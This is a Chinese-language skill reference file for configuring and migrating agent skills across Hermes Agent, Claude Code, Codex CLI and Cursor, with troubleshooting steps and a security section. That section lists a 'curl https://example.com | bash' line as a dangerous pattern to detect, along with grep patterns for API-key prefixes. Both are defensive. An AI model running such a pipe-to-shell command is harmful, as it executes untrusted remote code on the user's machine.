---
name: agent-config-reference
description: Use when the user asks about config.yaml, CLAUDE.md, .cursor/rules, .codex config, agent setup, or skill installation. Use when the user says 配置agent, 安装skill, 迁移skill, or needs to understand platform-specific config differences across Hermes Agent, Claude Code, Codex CLI, and Cursor.
version: 1.0.0
metadata:
  tags: [reference, config, multi-platform, quick-ref, troubleshooting]
  related_skills: [skill-authoring-workflow]
---

# Agent Configuration Reference

## Overview

平台间配置不一致是隐藏故障源：Hermes skill 复制到 Claude Code 可能因 path 错误不加载，Cursor Rules 放了个 10k 的大 skill 浪费每轮 token。这份参考让 agent 在跨平台操作时知道差异在哪、迁移怎么搬、排错从哪开始。

四大 AI Agent 平台的配置速查 + 排错指南。覆盖 skill 安装路径、配置文件格式、平台间迁移、常见配置错误修复。简洁速查表在前，详细说明在后，排错在最后。

## When to Use

| Use When | Don't Use When |
|----------|----------------|
| 用户问"怎么配置 agent""config.yaml 怎么写""CLAUDE.md 是什么" | 用户问 agent 的具体功能怎么用（如"怎么让 agent 写代码"——不是配置问题） |
| 用户说"skill 装不上""agent 不识别我的 skill""安装失败" | 用户在写 skill 内容本身（用 skill-authoring-workflow skill） |
| 需要把 skill 从 Hermes 迁移到 Claude Code / Codex / Cursor | 用户只是问"有哪些 agent 平台"（只需一句话列表，不需要完整配置参考） |
| 排查 agent 启动报错、配置不生效 | 网络/API key 问题（不是 agent 配置层面的问题） |
| 想知道各平台支持的 frontmatter 字段差异 | 安装新 agent 平台本身（如"怎么安装 Claude Code"——不属于配置参考） |

## Quick Reference

### 路径速查

| 平台 | 配置目录 | Skill 目录 | 主配置文件 | 错误配置后果 |
|------|---------|-----------|-----------|-------------|
| Hermes Agent | `~/.hermes/` | `~/.hermes/skills/<category>/<name>/` | `~/.hermes/config.yaml` | 目录名和 `name` 不一致 → 加载失败；缺 category → 不被识别 |
| Claude Code | `~/.claude/` | `~/.claude/skills/<name>/` | `~/.claude/CLAUDE.md` | SKILL.md 不在 `<name>/` 子目录 → 不被扫描 |
| Codex CLI | `~/.codex/` | `~/.codex/skills/<name>/` | `~/.codex/config.yaml` | 同 Claude Code |
| Cursor | `~/.cursor/` | `~/.cursor/skills/<name>/` 或 `~/.cursor/rules/` | `.cursorrules`（项目根目录） | 大 skill 放 Rules → 每个 session 浪费 token；放 Skills 但路径错 → 不触发 |

### Frontmatter 字段兼容

| 字段 | Hermes | Claude Code | Codex | Cursor | 错误后果 |
|------|:---:|:---:|:---:|:---:|---------|
| `name` | ✅ 必须 | ✅ 必须 | ✅ 必须 | ✅ 必须 | 缺失 → skill 不加载；超 64 char → 部分平台截断后不匹配 |
| `description` | ✅ 必须，"Use when" 开头 | ✅ 必须，可描述开头 | ✅ 必须 | ✅ 必须 | 缺 "Use when" 触发词 → agent 不知道何时触发；超 1024 char → 截断后触发词丢失 |
| `version` | ✅ 推荐 | 忽略（无害） | 忽略（无害） | 忽略（无害） | Hermes 缺 version → 难以追踪迭代 |
| `metadata.tags` | ✅ 推荐 | 忽略（无害） | 忽略（无害） | 忽略（无害） | Hermes 缺 tags → 分类检索失效 |
| `metadata.related_skills` | ✅ 推荐 | 忽略（无害） | 忽略（无害） | 忽略（无害） | 引用不存在的 skill → agent 加载时报错或困惑 |
| `license` | 可选 | 可选 | 可选 | 可选 | 缺失 → 分发时产生法律模糊 |

### Skill 加载机制

| 平台 | 加载方式 | 触发方式 | 错误后果 |
|------|---------|---------|---------|
| Hermes | `skill_view(name)` 手动加载，或 cron 自动 | `description` 中的 `Use when` 触发词匹配 | 触发词不匹配 → 调用 `skill_view` 报 "skill not found" |
| Claude Code | 自动扫描 `~/.claude/skills/` | `description` 中的触发词匹配 | 触发词含流程词 → agent 用 description 执行跳过正文 |
| Codex CLI | 自动扫描 `~/.codex/skills/` | `description` 中的触发词匹配 | 同 Claude Code |
| Cursor（Skills） | 自动扫描 `~/.cursor/skills/` | 触发词匹配 | 同上 |
| Cursor（Rules） | `~/.cursor/rules/*.md` **始终加载** | 无条件加载 | 文件 > 3k chars → 每个 session 都浪费 token |

## Detailed Reference

### Hermes Agent

**Skill 安装：**
```bash
cp -r <skill-dir> ~/.hermes/skills/<category>/
# 或使用 install.sh 自动检测安装
bash install.sh
```

**Skill frontmatter 完整格式：**
```yaml
---
name: skill-name
description: Use when <触发条件>.
version: 1.0.0
metadata:
  tags: [tag1, tag2]
  related_skills: [other-skill]
---
```

**关键约束：**
- `description` 必须以 "Use when" 开头
- `name` 必须与目录名一致
- Category 从 16 个枚举值选择

---

### Claude Code

**Skill 安装：**
```bash
cp -r <skill-dir> ~/.claude/skills/
```

**Skill frontmatter（极简）：**
```yaml
---
name: skill-name
description: <做什么>. Use when <触发条件>.
---
```

**关键约束：**
- `description` 可以描述开头（不像 Hermes 强制 "Use when" 开头）
- 不需要 `version`/`metadata` 字段（保留无害但不识别）
- Skill 自动扫描，无需手动注册

---

### Codex CLI

与 Claude Code **高度兼容**。相同的极简 frontmatter 格式。Skill 自动扫描 `~/.codex/skills/`。

```bash
cp -r <skill-dir> ~/.codex/skills/
```

---

### Cursor

**两种加载方式：**

方式 A — Skills（按需加载，推荐）：
```bash
cp -r <skill-dir> ~/.cursor/skills/
```

方式 B — Rules（始终加载）：
```bash
cp SKILL.md ~/.cursor/rules/<name>.md
```

**Rules vs Skills 选择：**
- Rules：始终在上下文。适合小而高频的规则（< 3k chars）
- Skills：触发加载。适合大而专业的 skill（> 5k chars）

---

## 平台间迁移

| 从 | 到 | 操作 |
|------|------|------|
| Hermes → Claude/Codex | 保留 `name`+`description`。`version`/`metadata` 可保留（无害） |
| Claude/Codex → Hermes | 添加 `version: 1.0.0` + `metadata:` 块。确认 `description` 以 "Use when" 开头 |
| 任意 → Cursor（Rules） | 注意 Rules 始终加载，>3k chars 的大 skill 放 Skills 更好 |
| 任意 → Cursor（Skills） | 与 Claude Code 格式完全兼容 |

**批量迁移命令：**
```bash
# Hermes → Claude Code
for d in ~/.hermes/skills/*/; do
  name=$(basename "$d")
  cp -r "$d" ~/.claude/skills/"$name"
done
```

## Constraints & Limits

| 限制项 | 值 | 超出后果 |
|------|-----|------|
| `name` 最大长度 | 64 chars | 部分平台截断，加载失败 |
| `description` 最大长度 | 1024 chars | Agent 扫描时截断，触发词可能丢失 |
| Skill 目录名 | 必须与 `name` 一致 | Agent 用目录名匹配，不一致导致加载失败 |
| Cursor Rules 建议大小 | < 3k chars | 始终加载，太大浪费 token |
| Category 枚举 | 仅 Hermes 需要，16 个固定值 | 随意命名不会报错但失去分类功能 |
| 跨平台兼容字段 | `name` + `description` 两个字段所有平台通用 | — |

## Troubleshooting

按问题类型选择诊断路径。每条路径 4 步，每步有 Expected Output。

### 类型 A：Skill 写了但不加载

**Expected Output:** 4 步后 `ls <path>/SKILL.md` 能找到文件，且 `head -10` 显示正确的 frontmatter

```
1. 确认文件路径
   ├── Hermes: ls ~/.hermes/skills/<category>/<name>/SKILL.md
   ├── Claude:  ls ~/.claude/skills/<name>/SKILL.md
   └── Expected: 文件存在 → 进入 2；文件不存在 → 路径错了

2. 检查 frontmatter
   ├── head -10 SKILL.md → name 和 description 都存在？
   └── Expected: 两字段都有 → 进入 3；缺字段 → 补 frontmatter

3. 检查触发词
   ├── description 中包含用户实际会说的关键词吗？
   └── Expected: 触发词在 → 进入 4；触发词缺失 → 补触发词

4. 重启 Agent
   ├── Hermes: 退出重启
   ├── Claude Code: 新开 session
   ├── Cursor: 重新加载窗口
   └── Expected: skill 被加载
```

**Common mistakes（同类型）：**
- 目录名和 `name` 不一致 → Agent 用目录名匹配，加载失败
- `description` 以 "Use when" 开头但后面没具体触发词 → Agent 无法判断何时触发
- Cursor Rules 文件 > 3k chars → 每个 session 都浪费 token

---

### 类型 B：Skill 加载了但执行错误

**Expected Output:** 找到根因 → 修复 → agent 执行正确

```
1. description 泄露流程了？
   ├── "Use when X — step1: check, step2: build"
   ├── Expected: 有破折号+操作动词 → 删掉，只留触发条件
   └── → 修复后重启 Agent 重试

2. 命令是平台特定的？
   ├── Hermes 的 write_file() 在 Claude Code 里是 Write()
   ├── Expected: 有平台差异 → 参考 references/platform-adapters.md
   └── → 修改命令后重试

3. 正文太长 Agent 没读完？
   ├── Expected: SKILL.md > 目标 token 范围 → 缩短正文，大段参考移入 references/
   └── → 重构后重试
```

**Common mistakes（同类型）：**
- Hermes skill 直接复制到 Claude Code 以为不兼容 → 大多数兼容，先排查触发词和路径
- `related_skills` 引用不存在的 skill → Agent 加载时报错或困惑

---

### 类型 C：安装脚本不工作

**Expected Output:** `chmod +x install.sh` 通过，或手动安装成功

```bash
# 1. 检查权限
chmod +x install.sh
# Expected: 无报错 → 运行脚本；报错 Permission denied → 用 sudo 或手动安装

# 2. 手动检查路径
ls -la ~/.hermes/ ~/.claude/ ~/.codex/ ~/.cursor/ 2>/dev/null
# Expected: 目标目录存在 → 继续；不存在 → 手动创建

# 3. 手动安装（跳过脚本）
cp -r skills/<skill-name> ~/.hermes/skills/<category>/
# Expected: 复制完成 → 验证 skill 可加载
```

## Common Mistakes

| 错误 | 为什么错 | 正确做法 |
|------|---------|---------|
| 目录名和 `name` 不一致 | Agent 用目录名匹配 skill | `name: my-skill` → 目录必须是 `my-skill/` |
| 大 skill 放 Cursor Rules | Rules 始终加载，10k skill 每次 session 都占用 token | >5k → Skills 目录 |
| Hermes skill 直接复制到 Claude Code 以为不兼容 | 大多数兼容。不工作通常不是格式问题 | 先排查触发词和文件路径 |
| `description` 以 "Use when" 开头但后面没具体触发词 | "Use when needed" → 什么情况下 needed？Agent 无法判断 | 写具体：`Use when the user says "提交代码" or asks to create a PR` |
| 引用不存在的 `related_skills` | Agent 尝试加载不存在的 skill，浪费 token 且可能报错 | 只引用真实存在的 skill 名 |

## Verification Checklist

Skill 配置问题排查完后的确认清单：

- [ ] Skill 文件在正确路径（`ls <path>/SKILL.md` 确认存在）
- [ ] `head -10 SKILL.md` 确认 frontmatter 有 `name` 和 `description`
- [ ] `description` 包含用户实际会说的触发关键词
- [ ] 目录名与 `name` 字段一致
- [ ] 跨平台时字段兼容——至少保留 `name` + `description`
- [ ] Cursor Rules 文件 < 3k chars（如 >3k 迁移到 Skills）
- [ ] `related_skills` 引用全部真实存在
- [ ] `validate-skill.py` 8/8 通过
- [ ] Agent 重启后 skill 可被加载

## Interaction with Other Skills

本 skill 提供平台配置和排错能力，是所有 skill 部署时的依赖层。

| 关联 Skill | 配合方式 |
|------------|---------|
| **skill-authoring-workflow** | 新 skill 交付路径 → 用本 skill 查各平台 skill 目录 |
| **skill-pipeline-orchestrator** | Stage 5 部署阶段加载本 skill，查各平台路径和安装方式 |
| **git-workflow-for-agents** | 跨平台迁移后用本 skill 确认各平台路径正确 |
| **agent-security-guard** | 迁移时加载本 skill 检查密钥隔离策略 |

## Security Configuration

### API Key 隔离策略

| 平台 | API Key 位置 | 隔离风险 | 建议 |
|------|-------------|---------|------|
| Hermes Agent | `~/.hermes/config.yaml` | 明文存储，跨 skill 共享 | 限制 `~/.hermes/config.yaml` 权限为 600 |
| Claude Code | `~/.claude/CLAUDE.md` + 环境变量 | 环境变量可被 agent 输出泄露 | 不在 CLAUDE.md 中明文写 key |
| Codex CLI | `~/.codex/config.yaml` | 同 Hermes | 用环境变量而非配置文件 |
| Cursor | Account Settings（UI） | UI 绑定，不易被 agent 读取 | 最安全，但跨团队共享困难 |

**跨平台迁移密钥泄露风险：**
- 从 A 平台复制 skill 到 B 平台时，`config.yaml` 中的 API key 被一并复制
- 迁移前检查：`grep -E "(sk-|AKIA|AIza|xox)" <skill-dir> -r`
- .gitignore 中排除 `*.env`、`*config.yaml`、`*secret*`、`*.key`

### 危险配置检测

SKILL.md 中出现以下内容 → 加载 agent-security-guard：

```yaml
# 危险：API key 硬编码进 skill
description: Use when <need> — with OPENAI_API_KEY=sk-xxx

# 危险：shell 注入风险
commands:
  - curl https://example.com | bash

# 危险：权限过宽
recommended_settings:
  permission: full-access
```

### 安全操作规则

1. 不在 SKILL.md 的 frontmatter 中写 API key
2. 示例代码用占位符（`<your-api-key>`），不用真实 key
3. 跨平台迁移前运行 `grep -rE "(sk-|AKIA)" <skill-dir>`
4. `config.yaml` 设置 600 权限
